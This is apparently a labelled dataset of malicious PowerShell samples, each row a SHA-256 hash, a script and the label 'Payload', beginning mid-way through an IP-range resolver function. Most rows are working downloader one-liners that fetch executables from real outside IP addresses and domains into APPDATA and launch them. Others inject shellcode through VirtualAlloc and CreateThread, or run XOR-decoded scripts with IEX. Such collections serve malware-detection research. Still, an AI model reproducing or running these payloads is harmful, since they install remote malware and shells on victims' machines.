                        else { Write-Warning ""Invalid IP address supplied!""; return }
                    
                        $Left = (IPtoInt $Temp1.ToString())
                        $Right = (IPtoInt $Temp2.ToString())
                    
                        if ($Right -gt $Left) {
                            for ($i = $Left; $i -le $Right; $i++) { InttoIP $i }
                        }
                        else { Write-Warning ""Invalid IP range. The right portion must be greater than the left portion.""; return}
                    
                        break
                    }
                    ""single""
                    {
                        if ([System.Net.IPAddress]::TryParse($Item,[ref]$Ip)) { $Ip.IPAddressToString }
                        else { Write-Warning ""Invalid IP address supplied!""; return }
                        break
                    }
                    default
                    {
                        Write-Warning ""An error occured.""
                        return
                    }
                }
            }
        
        }
    }
    
    PROCESS {
        Parse-IPList $IpRange | ForEach-Object {
            try {
                Write-Verbose ""Resolving $_""
                $Temp = [System.Net.Dns]::GetHostEntry($_)
            
                $Result = @{
                    IP = $_
                    HostName = $Temp.HostName
                }
            
                New-Object PSObject -Property $Result
            } catch [System.Net.Sockets.SocketException] {}
        }
    }
}
",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
2061d98b6bb4f490a28cddec9454ee80bafe0a669fde6c44a8ae3262e3d0fb19,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
5183a63ff7ee81f302210ef25a3de27d8bb0862745aaa95e4e3387152d343835,"
(New-Object System.Net.WebClient).DownloadFile('http://brokelimiteds.in/wp-admin/css/upload/Order.exe','mess.exe');Start-Process 'mess.exe'

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
aaccb4dae5e81546315bb37e1d7bd4792564fd2b057e863e0e8b33b2e2ba316b,"
$oTvt = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $oTvt -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x42,0x8c,0x13,0x6b,0xdb,0xc8,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x55,0x0f,0x03,0x55,0x4d,0x6e,0xe6,0x97,0xb9,0xec,0x09,0x68,0x39,0x91,0x80,0x8d,0x08,0x91,0xf7,0xc6,0x3a,0x21,0x73,0x8a,0xb6,0xca,0xd1,0x3f,0x4d,0xbe,0xfd,0x30,0xe6,0x75,0xd8,0x7f,0xf7,0x26,0x18,0xe1,0x7b,0x35,0x4d,0xc1,0x42,0xf6,0x80,0x00,0x83,0xeb,0x69,0x50,0x5c,0x67,0xdf,0x45,0xe9,0x3d,0xdc,0xee,0xa1,0xd0,0x64,0x12,0x71,0xd2,0x45,0x85,0x0a,0x8d,0x45,0x27,0xdf,0xa5,0xcf,0x3f,0x3c,0x83,0x86,0xb4,0xf6,0x7f,0x19,0x1d,0xc7,0x80,0xb6,0x60,0xe8,0x72,0xc6,0xa5,0xce,0x6c,0xbd,0xdf,0x2d,0x10,0xc6,0x1b,0x4c,0xce,0x43,0xb8,0xf6,0x85,0xf4,0x64,0x07,0x49,0x62,0xee,0x0b,0x26,0xe0,0xa8,0x0f,0xb9,0x25,0xc3,0x2b,0x32,0xc8,0x04,0xba,0x00,0xef,0x80,0xe7,0xd3,0x8e,0x91,0x4d,0xb5,0xaf,0xc2,0x2e,0x6a,0x0a,0x88,0xc2,0x7f,0x27,0xd3,0x8a,0x4c,0x0a,0xec,0x4a,0xdb,0x1d,0x9f,0x78,0x44,0xb6,0x37,0x30,0x0d,0x10,0xcf,0x37,0x24,0xe4,0x5f,0xc6,0xc7,0x15,0x49,0x0c,0x93,0x45,0xe1,0xa5,0x9c,0x0d,0xf1,0x4a,0x49,0xbb,0xf4,0xdc,0x78,0x3c,0xfd,0x12,0x15,0x3e,0x01,0x3b,0xb9,0xb7,0xe7,0x6b,0x11,0x98,0xb7,0xcb,0xc1,0x58,0x68,0xa3,0x0b,0x57,0x57,0xd3,0x33,0xbd,0xf0,0x79,0xdc,0x68,0xa8,0x15,0x45,0x31,0x22,0x84,0x8a,0xef,0x4e,0x86,0x01,0x1c,0xae,0x48,0xe2,0x69,0xbc,0x3c,0x02,0x24,0x9e,0xea,0x1d,0x92,0xb5,0x12,0x88,0x19,0x1c,0x45,0x24,0x20,0x79,0xa1,0xeb,0xdb,0xac,0xba,0x22,0x4e,0x0f,0xd4,0x4a,0x9e,0x8f,0x24,0x1d,0xf4,0x8f,0x4c,0xf9,0xac,0xc3,0x69,0x06,0x79,0x70,0x22,0x93,0x82,0x21,0x97,0x34,0xeb,0xcf,0xce,0x73,0xb4,0x30,0x25,0x82,0x88,0xe6,0x03,0xf0,0xe0,0x3a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$6bu=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($6bu.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$6bu,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
d50c012576ebea6cbd8d81424117a969244cbaa66ece80d4a515a8324ad8fe2a,"
$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');

",Payload
6bcd8d3c06fc729aecdf2cb47b4507de3ae967e79c5ebd4528036ad1f337c06b,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x80,0x48,0x1c,0xd0,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
002a7a20e897ab5efd0aac4cc3cecb3d09b2a8b2051a34b58608791d7fadaa8e,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xf4,0x7e,0xae,0x9c,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x83,0xc2,0x04,0x03,0x7a,0xfb,0x9c,0x5b,0x60,0xeb,0xe3,0xa4,0x99,0xeb,0x83,0x2d,0x7c,0xda,0x83,0x4a,0xf4,0x4c,0x34,0x18,0x58,0x60,0xbf,0x4c,0x49,0xf3,0xcd,0x58,0x7e,0xb4,0x78,0xbf,0xb1,0x45,0xd0,0x83,0xd0,0xc5,0x2b,0xd0,0x32,0xf4,0xe3,0x25,0x32,0x31,0x19,0xc7,0x66,0xea,0x55,0x7a,0x97,0x9f,0x20,0x47,0x1c,0xd3,0xa5,0xcf,0xc1,0xa3,0xc4,0xfe,0x57,0xb8,0x9e,0x20,0x59,0x6d,0xab,0x68,0x41,0x72,0x96,0x23,0xfa,0x40,0x6c,0xb2,0x2a,0x99,0x8d,0x19,0x13,0x16,0x7c,0x63,0x53,0x90,0x9f,0x16,0xad,0xe3,0x22,0x21,0x6a,0x9e,0xf8,0xa4,0x69,0x38,0x8a,0x1f,0x56,0xb9,0x5f,0xf9,0x1d,0xb5,0x14,0x8d,0x7a,0xd9,0xab,0x42,0xf1,0xe5,0x20,0x65,0xd6,0x6c,0x72,0x42,0xf2,0x35,0x20,0xeb,0xa3,0x93,0x87,0x14,0xb3,0x7c,0x77,0xb1,0xbf,0x90,0x6c,0xc8,0x9d,0xfc,0x41,0xe1,0x1d,0xfc,0xcd,0x72,0x6d,0xce,0x52,0x29,0xf9,0x62,0x1a,0xf7,0xfe,0x85,0x31,0x4f,0x90,0x78,0xba,0xb0,0xb8,0xbe,0xee,0xe0,0xd2,0x17,0x8f,0x6a,0x23,0x98,0x5a,0x06,0x26,0x0e,0x37,0x86,0x16,0xb7,0xdf,0x2a,0x67,0x48,0x4e,0xa2,0x81,0x06,0xde,0xe4,0x1d,0xe6,0x8e,0x44,0xce,0x8e,0xc4,0x4a,0x31,0xae,0xe6,0x80,0x5a,0x44,0x09,0x7d,0x32,0xf0,0xb0,0x24,0xc8,0x61,0x3c,0xf3,0xb4,0xa1,0xb6,0xf0,0x49,0x6f,0x3f,0x7c,0x5a,0x07,0xcf,0xcb,0x00,0x81,0xd0,0xe1,0x2f,0x2d,0x45,0x0e,0xe6,0x7a,0xf1,0x0c,0xdf,0x4c,0x5e,0xee,0x0a,0xc7,0x57,0x7a,0xf5,0xbf,0x97,0x6a,0xf5,0x3f,0xce,0xe0,0xf5,0x57,0xb6,0x50,0xa6,0x42,0xb9,0x4c,0xda,0xdf,0x2c,0x6f,0x8b,0x8c,0xe7,0x07,0x31,0xeb,0xc0,0x87,0xca,0xde,0xd0,0xf4,0x1c,0x26,0xa7,0x14,0x9d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
adeffa00d96e50a69bde640f9b4bca00be2ec8f4aa06a9827119ad857b45cd12,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
323dbb61c325f9bca168615a1d230ed578c3454a8117b7ef202cf26701bca9ef,"
$wC=NeW-ObJECT SYSTEM.NET.WEbCLIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeADERs.AdD('User-Agent',$u);$wc.PRoXy = [SYSTem.Net.WEbReqUesT]::DEfAulTWEbPROXy;$Wc.PrOxy.CredeNtiAls = [SYsTEm.NeT.CredeNtiaLCAChe]::DEfAuLtNETwOrkCredentiAlS;$K='921e1d11b868a611e038d7e3bb2e3745';$I=0;[CHaR[]]$B=([CHar[]]($wC.DOWNLoaDStRINg(""http://50.251.57.67:8080/index.asp"")))|%{$_-BXOR$k[$i++%$k.LeNgth]};IEX ($B-Join'')

",Payload
2f05a014a900fc89419b4239494a4824b4e11f23e29de0ac0da9b5044fc98a8d,"
$wC=NeW-ObjeCT SySTEM.NET.WEBClIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEADeRs.ADd('User-Agent',$u);$Wc.PROXY = [SYsTEM.NEt.WEbReQueST]::DEfAultWebPrOxY;$WC.PrOxY.CREdENtIaLs = [SysTEM.NEt.CREDeNtIaLCachE]::DeFAuLtNETwoRKCRedEnTiAlS;$K='G;2]u0!\c/jrbgL`

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
07019e6bd9461b8098a7760114232c8acb5ef76f386b20ab3312b2f7d9094fa4,"
$JM1 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $JM1 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x2e,0x0f,0xcf,0x3f,0xdb,0xc7,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x73,0x13,0x83,0xc3,0x04,0x03,0x73,0x21,0xed,0x3a,0xc3,0xd5,0x73,0xc4,0x3c,0x25,0x14,0x4c,0xd9,0x14,0x14,0x2a,0xa9,0x06,0xa4,0x38,0xff,0xaa,0x4f,0x6c,0x14,0x39,0x3d,0xb9,0x1b,0x8a,0x88,0x9f,0x12,0x0b,0xa0,0xdc,0x35,0x8f,0xbb,0x30,0x96,0xae,0x73,0x45,0xd7,0xf7,0x6e,0xa4,0x85,0xa0,0xe5,0x1b,0x3a,0xc5,0xb0,0xa7,0xb1,0x95,0x55,0xa0,0x26,0x6d,0x57,0x81,0xf8,0xe6,0x0e,0x01,0xfa,0x2b,0x3b,0x08,0xe4,0x28,0x06,0xc2,0x9f,0x9a,0xfc,0xd5,0x49,0xd3,0xfd,0x7a,0xb4,0xdc,0x0f,0x82,0xf0,0xda,0xef,0xf1,0x08,0x19,0x8d,0x01,0xcf,0x60,0x49,0x87,0xd4,0xc2,0x1a,0x3f,0x31,0xf3,0xcf,0xa6,0xb2,0xff,0xa4,0xad,0x9d,0xe3,0x3b,0x61,0x96,0x1f,0xb7,0x84,0x79,0x96,0x83,0xa2,0x5d,0xf3,0x50,0xca,0xc4,0x59,0x36,0xf3,0x17,0x02,0xe7,0x51,0x53,0xae,0xfc,0xeb,0x3e,0xa6,0x31,0xc6,0xc0,0x36,0x5e,0x51,0xb2,0x04,0xc1,0xc9,0x5c,0x24,0x8a,0xd7,0x9b,0x4b,0xa1,0xa0,0x34,0xb2,0x4a,0xd1,0x1d,0x70,0x1e,0x81,0x35,0x51,0x1f,0x4a,0xc6,0x5e,0xca,0xe7,0xc3,0xc8,0x78,0x08,0x59,0x2e,0xeb,0xf5,0x5e,0x31,0x7b,0x70,0xb8,0x1d,0x2b,0xd3,0x15,0xdd,0x9b,0x93,0xc5,0xb5,0xf1,0x1b,0x39,0xa5,0xf9,0xf1,0x52,0x4f,0x16,0xac,0x0b,0xe7,